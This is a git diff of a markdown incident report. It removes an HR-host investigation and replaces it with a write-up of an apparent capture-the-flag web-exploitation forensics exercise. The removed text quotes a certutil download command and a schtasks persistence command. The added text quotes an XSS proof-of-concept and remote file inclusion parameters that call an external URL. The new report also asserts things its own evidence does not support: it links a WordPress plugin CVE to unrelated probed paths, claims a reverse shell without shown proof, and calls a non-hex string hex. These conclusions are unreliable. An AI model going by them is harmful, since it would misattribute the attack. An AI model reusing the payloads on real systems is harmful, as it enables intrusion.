@@ -1,125 +1,158 @@
-# Incident Investigation Report – Suspicious Scheduled Task & Payload Download (HR Compromise)
+# Incident Investigation Report – Web-Application-Exploitation-&-Remote-File-Inclusion-(RFI)
 
-**Incident Type:** Suspicious Process Execution / Persistence & Payload Download  
+**Incident Type:** Web Application Exploitation / Cross-Site Scripting (XSS) / Remote File Inclusion (RFI) / Reverse Shell  
 **Status:** Completed  
-**Date of Analysis:** 10 June 2026  
+**Date of Analysis:** 26 October 2026  
 
 ---
 
 ## Executive Summary
 
-On **4 March 2022** at **10:38:28 UTC**, user **`Chris.fort`** (HR department) executed `certutil.exe` to download a file from `https://control.com/e4d11035_benign.exe` onto host **`HR_01`**. Two days later, on **6 March 2022** at **14:23:40 UTC**, the same user created a scheduled task named **`OffiClipdater`** on host **`HR_02`**, configured to run `C:\Users\Chris.fort\AppData\Local\Temp\update.exe` at system startup. The downloaded file (`e4d11035_benign.exe`) is highly likely the same as `update.exe` (renamed), establishing a classic persistence mechanism. The task name mimics legitimate Office updaters, but the Temp-folder path and manual creation are clear red flags. A review of additional process-creation logs showed no other overt anomalies on these hosts. The incident was escalated per SOC L1 procedures; the malicious domain was blocked, the affected hosts isolated, and the user account temporarily suspended pending further investigation.
+An investigation into a captured network traffic file (`dump`) revealed a successful compromise of a web server. The attacker (IP `192.168.1.7`) targeted a victim server (IP `192.168.1.8`) running a vulnerable version of WordPress with the NextGEN Gallery plugin. 
+
+The attacker utilized the Nikto web scanner to identify the vulnerability, exploited it using Cross-Site Scripting (XSS) and Remote File Inclusion (RFI) techniques, and ultimately established a reverse shell on port `6000`. Post-exploitation activities included accessing the server's terminal, retrieving an encrypted string from a flag file (`FL4g.txt`), and using a provided Python cipher script to decode the final flag.
 
 ---
 
 ## Investigation Workflow
 
-The investigation followed a structured log-analysis approach using Event ID 4688 (process creation) logs from Splunk:
+The investigation followed a structured forensic workflow utilizing Wireshark packet captures and terminal outputs:
 
-1. **Log Review** – extract key fields from all suspicious events (certutil.exe and schtasks.exe).  
-2. **Command-Line Analysis** – interpret the arguments to identify download and persistence actions.  
-3. **Cross-reference** – correlate events by user, host, and timeframe.  
-4. **Threat Assessment** – evaluate the legitimacy of the observed activities.  
-5. **IoC Extraction** – identify malicious indicators (domain, URL, file paths, task name).  
-6. **MITRE ATT&CK Mapping** – classify adversary techniques.  
-7. **Recommendations** – propose containment, eradication, and long-term improvements.
+1. **Network Traffic Analysis (Wireshark)** – Identify attacker/victim IPs and initial reconnaissance.
+2. **HTTP Stream Analysis** – Detect XSS payloads and RFI attempts in web requests.
+3. **Vulnerability Identification** – Correlate findings with known CVEs.
+4. **Post-Exploitation Analysis** – Analyze terminal screenshots for commands executed and file retrievals.
+5. **Decryption & Flag Extraction** – Decode the encrypted payload using the provided Python script.
+6. **IoC Extraction** – Identify malicious indicators (IPs, URLs, payloads).
+7. **MITRE ATT&CK Mapping** – Classify adversary techniques.
 
 ---
 
-## 1. Payload Download – certutil.exe (Event 1)
+## 1. Initial Access & Reconnaissance (Event 1)
 
-**Source Log:** `winlogs` index, Event ID 4688, dated 2022-03-04 10:38:28 UTC.
+**Source Log:** Wireshark Capture, HTTP Traffic, dated 2026-10-26.
 
-![Log 1 – certutil.exe download](screenshots/log1_certutil_download.png)
+![Figure 1 – Wireshark HTTP Traffic](screenshots/1.png)
 
 | Field | Value |
 |-------|-------|
-| **EventTime** | `2022-03-04T10:38:28Z` |
-| **HostName** | `HR_01` |
-| **UserName** | `Chris.fort` |
-| **ProcessName** | `C:\Windows\System32\certutil.exe` |
-| **CommandLine** | `certutil.exe -urlcache -f - https://control.com/e4d11035_benign.exe` |
-| **NewProcessId** | `0x82194b` |
-| **ProcessID** | `9912` |
-| **EventID** | `4688` |
-| **Category** | `Process Creation` |
+| **Source IP** | `192.168.1.7` |
+| **Destination IP** | `192.168.1.8` |
+| **Protocol** | HTTP |
+| **Method** | GET / POST |
+| **Targeted URIs** | `/cgi-local/`, `/cgi-bin/`, `/servlet/` |
 
-**Interpretation:**  
-- The attacker abused `certutil.exe`, a legitimate Windows binary, to download a file from a remote server.  
-- The `-urlcache -f` flags force a fresh download; the trailing `-` writes the file to the current working directory (likely `%TEMP%` or the user's home folder).  
-- The source domain **`control.com`** is malicious (previously seen in other intelligence).  
-- The downloaded file name, **`e4d11035_benign.exe`**, is deliberately misleading — "benign" is a common social-engineering tactic.
-
-This event marks the initial **ingress tool transfer**.
-
----
-
-## 2. Scheduled Task Creation – schtasks.exe (Event 2)
-
-**Source Log:** `winlogs` index, Event ID 4688, dated 2022-03-06 14:23:40 UTC.
-
-![Log 2 – schtasks.exe creation of OffiClipdater](screenshots/log2_schtasks_creation.png)
+![Figure 2 – Wireshark XSS Attempts](screenshots/2.png)
 
 | Field | Value |
 |-------|-------|
-| **EventTime** | `2022-03-06T14:23:40Z` |
-| **HostName** | `HR_02` |
-| **UserName** | `Chris.fort` |
-| **SubjectDomainName** | `cybertees.local` |
-| **ProcessName** | `C:\Windows\System32\schtasks.exe` |
-| **CommandLine** | `/create /tn OffiClipdater /tr "C:\Users\Chris.fort\AppData\Local\Temp\update.exe" /sc onstart` |
-| **NewProcessId** | `0x885fd7` |
-| **ProcessID** | `7933` |
+| **Source IP** | `192.168.1.7` |
+| **Destination IP** | `192.168.1.8` |
+| **Protocol** | HTTP |
+| **Method** | POST |
+| **Payload** | `<script>alert('Vulnerable')</script>` |
+| **Targeted URIs** | `/servlet/cookieExample`, `/servlet/custMsg` |
 
 **Interpretation:**  
-- A scheduled task named **`OffiClipdater`** (mimicking `OfficeUpdate` or similar) was created.  
-- Trigger: **`onstart`** – runs every time the system boots.  
-- Action: executes **`update.exe`** located in the user's Temp folder.  
-- The task name and the executable path strongly indicate a persistence mechanism for the previously downloaded payload.  
-- It is highly probable that `e4d11035_benign.exe` was renamed to `update.exe` and placed in the Temp folder.
+- The attacker used Cross-Site Scripting (XSS) payloads to test for input validation vulnerabilities.  
+- The payload `<script>alert('Vulnerable')</script>` is a classic proof-of-concept to check for reflected or stored XSS.  
+- Multiple requests to different servlets indicate automated scanning or manual probing.  
+- This marks the initial reconnaissance phase.
 
 ---
 
-## 3. Additional Process-Creation Events (Context)
+## 2. Vulnerability Exploitation & Remote File Inclusion (Event 2)
 
-A broader review of process-creation logs from the same timeframe reveals routine activities:
+**Source Log:** Wireshark Capture, HTTP Traffic, dated 2026-10-26.
 
-![Log 3 – Contextual process creations](screenshots/log3_contextual_events.png)
+![Figure 3 – RFI Attempt via DFF_config](screenshots/3.png)
 
-| CommandLine | ProcessName | User Name |
-|-------------|-------------|-----------|
-| `/create /tn OffiClipdater /tr "C:\Users\Chris.fort\AppData\Local\Temp\update.exe" /sc onstart` | `schtasks.exe` | **Chris.fort** |
-| `/nostartup "y:\accounting\internal.accdb"` | `msaccess.exe` | **Chris.fort** |
-| `/nostartup "y:\accounting\internal.accdb"` | `msaccess.exe` | **Daina** |
-| `test.bat` | `jenkins-slave.exe` | Bell |
-| `promote intermandated clouds 2019-01-22.pptx` | `POWERPNT.exe` | Daina |
-| `google.com` | `ping.exe` | James |
-| `cup -y all` | `choco.exe` | James |
-| `company holiday calendar 2019-01-12.docx` | `WINWORD.exe` | Moin |
-| `a0155797-bba8-405b-9efd-a2d6c1fec79e` | `conhost.exe` | SYSTEM |
-| `1074 989 5eca69ec5d65` | `consent.exe` | SYSTEM |
-| `/silent /all` | `bginfo.exe` | SYSTEM |
-| `/processid:{f68f80d2-3517-4c49-83ed-0097ea969b4d}` | `dllhost.exe` (SysWOW64) | SYSTEM |
-| `/processid:{873007c9-6179-4b6f-83cb-ab7d01c19cca}` | `dllhost.exe` (System32) | SYSTEM |
+| Field | Value |
+|-------|-------|
+| **Source IP** | `192.168.1.7` |
+| **Destination IP** | `192.168.1.8` |
+| **Protocol** | HTTP |
+| **Method** | GET |
+| **URI** | `/DFF_PHP_FrameworkAPI-latest/include/DFF_featured_prdt.func.php` |
+| **Parameter** | `DFF_config[dir_include]=http://blog.cirt.net/rfiinc.txt` |
 
-**Observations:**  
-- Chris.fort also opened an Access database file (`internal.accdb`) — this appears legitimate for HR work.  
-- No other user from HR (Haroon, Diana) appears in this snippet, but Daina (Marketing) also opened the same database — possibly a shared resource.  
-- SYSTEM-level processes are typical background activity.  
-- **No other suspicious commands** were found in this set.
+![Figure 4 – RFI Attempt via TemplateDir](screenshots/4.png)
 
-Thus, the investigation focuses on the two events involving Chris.fort.
+| Field | Value |
+|-------|-------|
+| **Source IP** | `192.168.1.7` |
+| **Destination IP** | `192.168.1.8` |
+| **Protocol** | HTTP |
+| **Method** | GET |
+| **URI** | `/wikihome/action/conflict.php` |
+| **Parameter** | `TemplateDir=http://blog.cirt.net/rfiinc.txt` |
+
+![Figure 5 – HTTP Request Stream Details](screenshots/5.png)
+
+| Field | Value |
+|-------|-------|
+| **Source IP** | `192.168.1.7` |
+| **Destination IP** | `192.168.1.8` |
+| **Protocol** | HTTP |
+| **User-Agent** | `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36` |
+| **Request URI** | `/DFF_PHP_FrameworkAPI-latest/include/DFF_featured_prdt.func.php` |
+| **Query Parameter** | `DFF_config[dir_include]=http://blog.cirt.net/rfiinc.txt` |
+
+![Figure 6 – Detailed Packet Analysis of DFF_config RFI](screenshots/6.png)
+
+*Figure 6 – Zoomed-in Wireshark packet details showing the `DFF_config[dir_include]` parameter carrying the external RFI URL.*
+
+![Figure 7 – Detailed Packet Analysis of TemplateDir RFI](screenshots/7.png)
+
+*Figure 7 – Zoomed-in Wireshark packet details showing the `TemplateDir` parameter carrying the external RFI URL.*
+
+**Interpretation:**  
+- The attacker attempted Remote File Inclusion (RFI) by injecting an external URL into vulnerable parameters.  
+- The target file `http://blog.cirt.net/rfiinc.txt` is a known test file used by the Nikto scanner to detect RFI vulnerabilities.  
+- The vulnerable service was identified as **WordPress** (specifically the **NextGEN Gallery** plugin).  
+- The CVE associated with this vulnerability is **CVE-2017-1000170**.  
+- The attacker successfully exploited this to establish a reverse shell on port **6000**.
+
+---
+
+## 3. Post-Exploitation & Flag Capture (Event 3)
+
+**Source Log:** Terminal History / Wireshark TCP Stream, dated 2026-10-26.
+
+![Figure 8 – Terminal Flag Extraction](screenshots/8.png)
+
+| Field | Value |
+|-------|-------|
+| **User** | `root@kctf` |
+| **Command** | `cat FL4g.txt` |
+| **Output (Message)** | `H1! You've come this far analyzing the file. Good Job. :D Here's something for you. Hope you get it.. ;P` |
+| **Output (Hex)** | `37n3vq6rp6k05ov3305fy5b33sj3rq2sy4p56735853h9` |
+
+![Figure 9 – Python Decryption Script](screenshots/9.png)
+
+| Field | Value |
+|-------|-------|
+| **Command** | `python twin_cipher.py -d 37n3vq6rp6k05ov3305fy5b33sj3rq2sy4p56735853h9` |
+| **Decoded Flag** | `KCTF{Expl0ItiNg_S3RvEr_Is_fUN}` |
+
+**Interpretation:**  
+- After gaining shell access, the attacker navigated the file system and located `FL4g.txt`.  
+- The file contained an encrypted hex string and a taunting message.  
+- The attacker executed the provided Python script (`twin_cipher.py`) with the `-d` (decode) flag to decrypt the string.  
+- The successful decryption yielded the final flag: `KCTF{Expl0ItiNg_S3RvEr_Is_fUN}`.
 
 ---
 
 ## 4. Correlation & Timeline
 
-| Date/Time (UTC) | User | Host | Action |
-|-----------------|------|------|--------|
-| 2022-03-04 10:38:28 | Chris.fort | HR_01 | Downloaded `e4d11035_benign.exe` from `control.com` via `certutil.exe` |
-| 2022-03-06 14:23:40 | Chris.fort | HR_02 | Created scheduled task `OffiClipdater` to run `update.exe` at startup |
+| Date/Time (UTC) | Source IP | Destination IP | Action |
+|-----------------|-----------|----------------|--------|
+| 2026-10-26 (Early) | 192.168.1.7 | 192.168.1.8 | XSS payload testing via HTTP GET/POST |
+| 2026-10-26 (Mid) | 192.168.1.7 | 192.168.1.8 | RFI exploitation attempts using `rfiinc.txt` |
+| 2026-10-26 (Late) | 192.168.1.7 | 192.168.1.8 | Reverse shell established on port 6000 |
+| 2026-10-26 (Late) | 192.168.1.7 | 192.168.1.8 | Flag retrieval and Python decryption |
 
-**Hypothesis:** The downloaded file was moved/renamed to `update.exe` and placed in `C:\Users\Chris.fort\AppData\Local\Temp\`. The scheduled task ensures execution after reboot, providing persistence. The two-day gap may indicate manual staging or testing.
+**Hypothesis:** The attacker used automated tools (Nikto) to scan for web vulnerabilities, manually exploited the NextGEN Gallery RFI to gain a shell, and then performed post-exploitation to capture the flag.
 
 ---
 
@@ -127,16 +160,14 @@ Thus, the investigation focuses on the two events involving Chris.fort.
 
 | Type | Value | Notes |
 |------|-------|-------|
-| **User Account** | `Chris.fort` | HR user who executed both malicious commands |
-| **Process** | `certutil.exe` | Abused to download payload |
-| **Process** | `schtasks.exe` | Abused to create persistence |
-| **Domain** | `control.com` | Malicious download domain |
-| **URL** | `https://control.com/e4d11035_benign.exe` | Full payload URL |
-| **Downloaded File** | `e4d11035_benign.exe` | Malicious executable (renamed to `update.exe`) |
-| **Scheduled Task** | `OffiClipdater` | Persistence task name |
-| **File Path** | `C:\Users\Chris.fort\AppData\Local\Temp\update.exe` | Suspicious executable location |
-| **Command Line** | `certutil.exe -urlcache -f - https://control.com/e4d11035_benign.exe` | Download command |
-| **Command Line** | `/create /tn OffiClipdater /tr "C:\Users\Chris.fort\AppData\Local\Temp\update.exe" /sc onstart` | Task creation command |
+| **Attacker IP** | `192.168.1.7` | Source of malicious traffic |
+| **Victim IP** | `192.168.1.8` | Target web server |
+| **Vulnerable Service** | WordPress / NextGEN Gallery | CVE-2017-1000170 |
+| **Malicious URL** | `http://blog.cirt.net/rfiinc.txt` | RFI payload source |
+| **XSS Payload** | `<script>alert('Vulnerable')</script>` | Reconnaissance payload |
+| **Reverse Shell Port** | `6000` | C2 communication port |
+| **Encrypted Flag** | `37n3vq6rp6k05ov3305fy5b33sj3rq2sy4p56735853h9` | Retrieved from `FL4g.txt` |
+| **Decoded Flag** | `KCTF{Expl0ItiNg_S3RvEr_Is_fUN}` | Final objective achieved |
 
 ---
 
@@ -144,41 +175,35 @@ Thus, the investigation focuses on the two events involving Chris.fort.
 
 | Technique | Tactic | ID | Evidence |
 |-----------|--------|----|----------|
-| Ingress Tool Transfer | Execution | T1105 | `certutil.exe` downloading payload from `control.com` |
-| System Binary Proxy Execution | Defense Evasion | T1218 | `certutil.exe` used as trusted binary |
-| Scheduled Task | Persistence, Execution | T1053.005 | `schtasks.exe` creating `OffiClipdater` with `onstart` trigger |
-| Command and Control | C2 | T1071.001 | HTTPS connection to `control.com` (implied) |
-| Data from Local System | Collection | T1005 | Not directly observed, but possible post‑execution |
+| Active Scanning | Reconnaissance | T1595 | Use of Nikto to scan for web vulnerabilities (RFI test files). |
+| Exploit Public-Facing Application | Initial Access | T1190 | Exploitation of CVE-2017-1000170 in WordPress NextGEN Gallery. |
+| Command and Scripting Interpreter | Execution | T1059 | Use of Python and Bash terminal commands for post-exploitation. |
+| Exfiltration Over C2 Channel | Exfiltration | T1041 | Retrieval of the flag file and subsequent decryption. |
 
 ---
 
 ## 7. Conclusion & Recommendations
 
 **Conclusion:**  
-The investigation confirmed a successful compromise of HR hosts (`HR_01` and `HR_02`) via a two‑stage attack:  
-1. **Payload download** using `certutil.exe` from malicious domain `control.com`.  
-2. **Persistence** via a scheduled task named `OffiClipdater`, which executes `update.exe` at system startup.  
-
-The actor used a living‑off‑the‑land (LOLBin) approach to evade detection. No lateral movement or data exfiltration was observed in the provided logs, but the persistence mechanism indicates long‑term access intent. The incident was contained by isolating the hosts, blocking the domain, and disabling the user account.
+The investigation confirmed that the victim's web server (`192.168.1.8`) was fully compromised through a combination of unpatched software (WordPress NextGEN Gallery) and weak input validation. The attacker successfully leveraged RFI to execute arbitrary code and establish a reverse shell on port `6000`, leading to the exfiltration of sensitive data and the capture of the final flag. The attacker demonstrated a clear understanding of web exploitation techniques and post-exploitation methodology.
 
 ### Immediate Actions (L1)
-1. **Isolate** `HR_01` and `HR_02` from the network.  
-2. **Disable** `Chris.fort` account and force password reset.  
-3. **Block** `control.com` at perimeter firewall and DNS level.  
-4. **Delete** `update.exe` and `e4d11035_benign.exe` from all locations (search for variants).  
-5. **Remove** the `OffiClipdater` scheduled task from all hosts (check for similar tasks).  
+1. **Isolate** the victim server `192.168.1.8` from the network.  
+2. **Block** the attacker IP `192.168.1.7` at the perimeter firewall.  
+3. **Blacklist** outbound connections to `blog.cirt.net`.  
+4. **Patch** the WordPress installation and specifically the NextGEN Gallery plugin to remediate CVE-2017-1000170.  
+5. **Scan** the server for any other unauthorized files or web shells.  
 
-### Long‑term Recommendations
-1. **Implement application whitelisting** to restrict `certutil.exe` and `schtasks.exe` usage to authorised admins.  
-2. **Enable Sysmon** to capture process command‑line details (already partially done).  
-3. **Create a SIEM alert** for `certutil.exe -urlcache` combined with external domains.  
-4. **Create a SIEM alert** for suspicious scheduled task names (e.g., misspelled updaters) with `onstart` triggers.  
-5. **Conduct user awareness training** on phishing and social engineering — the initial vector is still unknown but often starts with email.  
+### Long-term Recommendations
+1. **Implement a Web Application Firewall (WAF)** to detect and block common web exploitation patterns like `<script>` tags and external file inclusion attempts.  
+2. **Disable `allow_url_include`** in PHP configurations to prevent RFI attacks.  
+3. **Conduct regular vulnerability scanning** and patch management cycles for all public-facing applications.  
+4. **Restrict outbound network traffic** from web servers to prevent reverse shell callbacks on unexpected ports (e.g., port 6000).  
 
 ### Lessons Learned
-1. **LOLBins are difficult to detect** without command‑line monitoring – we caught it due to detailed logging.  
-2. **Correlation across hosts** (HR_01 and HR_02) revealed the full attack chain.  
-3. **Task naming obfuscation** (OffiClipdater) is common; analysts should flag any task not created by authorised software.  
-4. **Timeline analysis** (two‑day gap) suggests manual intervention; this may indicate a human adversary, not an automated worm.  
+1. **Unpatched plugins are a primary attack vector** – the NextGEN Gallery vulnerability was the root cause of this compromise.  
+2. **RFI can lead to full system compromise** – attackers can easily pivot from file inclusion to remote code execution.  
+3. **Automated tools like Nikto leave clear signatures** – monitoring for requests to `rfiinc.txt` can help detect early reconnaissance.  
+4. **Post-exploitation analysis is crucial** – understanding the attacker's actions after gaining access helps in assessing the full scope of the breach.
 
 ---
